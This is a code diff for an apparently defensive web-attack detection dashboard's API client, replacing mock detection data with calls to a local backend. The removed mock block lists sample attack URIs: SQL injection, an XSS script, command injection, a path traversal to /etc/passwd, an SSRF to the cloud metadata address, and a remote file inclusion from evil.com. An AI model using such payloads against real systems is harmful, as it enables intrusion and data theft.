@@ -1,122 +1,144 @@
 import type { DetectionResult, AnalysisSummary, FilterState } from '../types';
 
-const ATTACK_TYPES: DetectionResult['attack_prediction'][] = ['Benign', 'SQLi', 'XSS', 'CMD Injection', 'Directory Traversal', 'Web Shell', 'Credential Stuffing', 'SSRF', 'LFI/RFI'];
+// API Configuration
+const API_BASE_URL = 'http://localhost:5000/api';
 
-// --- Mock Data Generation ---
-const generateMockResult = (id: number): DetectionResult => {
-  const attackType = ATTACK_TYPES[Math.floor(Math.random() * ATTACK_TYPES.length)];
-  const isAttack = attackType !== 'Benign';
-  const timestamp = new Date(Date.now() - Math.random() * 1000 * 3600 * 24).toISOString();
-  
-  const uris = {
-    'Benign': `/index.php?page=about`,
-    'SQLi': `/login.php?user=' OR 1=1 --`,
-    'XSS': `/search?q=<script>alert(1)</script>`,
-    'CMD Injection': `/exec?cmd=ls -la`,
-    'Directory Traversal': `/static?file=../../../../etc/passwd`,
-    'Web Shell': `/uploads/shell.php`,
-    'Credential Stuffing': `/api/login`,
-    'SSRF': `/proxy?url=http://169.254.169.254/latest/meta-data/`,
-    'LFI/RFI': `/include?page=http://evil.com/shell.txt`
-  };
-
-  return {
-    id,
-    timestamp,
-    src_ip: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
-    host: 'victim-server.com',
-    uri: uris[attackType] || '/index.html',
-    attack_prediction: attackType,
-    confidence: isAttack ? Math.random() * 0.6 + 0.4 : Math.random() * 0.3,
-    rule_matched: isAttack && Math.random() > 0.5 ? `RULE_${attackType.toUpperCase()}` : null,
-    success_flag: isAttack && Math.random() > 0.7,
-  };
-};
-
-const MOCK_DB: DetectionResult[] = Array.from({ length: 200 }, (_, i) => generateMockResult(i + 1));
-
-// --- Mock API Functions ---
+// Current analysis ID
+let currentAnalysisId: string | null = null;
 
 export const analyzePcap = async (file: File): Promise<AnalysisSummary> => {
-  console.log(`Simulating analysis for ${file.name}...`);
-  // Simulate network delay and processing time
-  await new Promise(resolve => setTimeout(resolve, 2000));
+  console.log(`Analyzing PCAP file: ${file.name}...`);
+  
+  const formData = new FormData();
+  formData.append('file', file);
 
-  if (file.name.includes('error')) {
-    throw new Error("PCAP analysis failed: Invalid file format.");
+  try {
+    const response = await fetch(`${API_BASE_URL}/analyze/pcap`, {
+      method: 'POST',
+      body: formData,
+    });
+
+    if (!response.ok) {
+      const error = await response.json();
+      throw new Error(error.error || 'PCAP analysis failed');
+    }
+
+    const data = await response.json();
+    currentAnalysisId = data.analysis_id;
+    
+    return {
+      count: data.count,
+      results: data.results
+    };
+  } catch (error) {
+    console.error('Error analyzing PCAP:', error);
+    throw error;
   }
-
-  const count = MOCK_DB.length;
-  // Return a summary with the first few results
-  const results = MOCK_DB.slice(0, 10);
-  return { count, results };
 };
 
 export const analyzeHttpLog = async (file: File): Promise<AnalysisSummary> => {
-  console.log(`Simulating analysis for HTTP log ${file.name}...`);
-  // Simulate network delay and processing time, slightly faster than PCAP analysis
-  await new Promise(resolve => setTimeout(resolve, 1500));
+  console.log(`Analyzing HTTP log: ${file.name}...`);
+  
+  const formData = new FormData();
+  formData.append('file', file);
 
-  if (file.name.includes('error')) {
-    throw new Error("HTTP log analysis failed: Invalid file format.");
+  try {
+    const response = await fetch(`${API_BASE_URL}/analyze/log`, {
+      method: 'POST',
+      body: formData,
+    });
+
+    if (!response.ok) {
+      const error = await response.json();
+      throw new Error(error.error || 'Log analysis failed');
+    }
+
+    const data = await response.json();
+    currentAnalysisId = data.analysis_id;
+    
+    return {
+      count: data.count,
+      results: data.results
+    };
+  } catch (error) {
+    console.error('Error analyzing log:', error);
+    throw error;
   }
-
-  // Use the same mock DB for simplicity
-  const count = MOCK_DB.length;
-  const results = MOCK_DB.slice(0, 10);
-  return { count, results };
 };
 
 export const getResults = async (filters: FilterState, offset: number = 0, limit: number = 20): Promise<DetectionResult[]> => {
+  if (!currentAnalysisId) {
+    throw new Error('No analysis in progress');
+  }
+
   console.log('Fetching results with filters:', filters, 'offset:', offset, 'limit:', limit);
-  await new Promise(resolve => setTimeout(resolve, 500));
 
-  let filteredData = MOCK_DB;
+  try {
+    const params = new URLSearchParams({
+      offset: offset.toString(),
+      limit: limit.toString(),
+    });
 
-  if (filters.ip) {
-    filteredData = filteredData.filter(r => r.src_ip.includes(filters.ip));
-  }
-  if (filters.attack_type && filters.attack_type !== 'All') {
-    filteredData = filteredData.filter(r => r.attack_prediction === filters.attack_type);
-  }
-  if (filters.confidence > 0) {
-    filteredData = filteredData.filter(r => (r.confidence * 100) >= filters.confidence);
-  }
+    if (filters.ip) params.append('ip', filters.ip);
+    if (filters.attack_type && filters.attack_type !== 'All') {
+      params.append('attack_type', filters.attack_type);
+    }
+    if (filters.confidence > 0) {
+      params.append('confidence', filters.confidence.toString());
+    }
 
-  return filteredData.slice(offset, offset + limit);
+    const response = await fetch(`${API_BASE_URL}/results/${currentAnalysisId}?${params}`);
+
+    if (!response.ok) {
+      const error = await response.json();
+      throw new Error(error.error || 'Failed to fetch results');
+    }
+
+    const data = await response.json();
+    return data.results;
+  } catch (error) {
+    console.error('Error fetching results:', error);
+    throw error;
+  }
 };
 
 export const downloadResults = async (format: 'csv' | 'json'): Promise<void> => {
-  console.log(`Downloading results in ${format} format...`);
-  await new Promise(resolve => setTimeout(resolve, 1000));
-  
-  let dataStr: string;
-  let mimeType: string;
-  let filename: string;
-
-  if (format === 'json') {
-    dataStr = JSON.stringify(MOCK_DB, null, 2);
-    mimeType = 'application/json';
-    filename = 'analysis_results.json';
-  } else {
-    const headers = Object.keys(MOCK_DB[0]).join(',');
-    const rows = MOCK_DB.map(row => 
-        Object.values(row).map(value => 
-            `"${String(value).replace(/"/g, '""')}"`
-        ).join(',')
-    );
-    dataStr = [headers, ...rows].join('\n');
-    mimeType = 'text/csv';
-    filename = 'analysis_results.csv';
+  if (!currentAnalysisId) {
+    throw new Error('No analysis in progress');
   }
 
-  const blob = new Blob([dataStr], { type: mimeType });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
+  console.log(`Downloading results in ${format} format...`);
+
+  try {
+    const response = await fetch(`${API_BASE_URL}/export/${currentAnalysisId}/${format}`);
+
+    if (!response.ok) {
+      const error = await response.json();
+      throw new Error(error.error || 'Export failed');
+    }
+
+    // Download file
+    const blob = await response.blob();
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `analysis_${currentAnalysisId}.${format}`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  } catch (error) {
+    console.error('Error downloading results:', error);
+    throw error;
+  }
+};
+
+export const checkHealth = async (): Promise<boolean> => {
+  try {
+    const response = await fetch(`${API_BASE_URL}/health`);
+    return response.ok;
+  } catch (error) {
+    console.error('Health check failed:', error);
+    return false;
+  }
 };
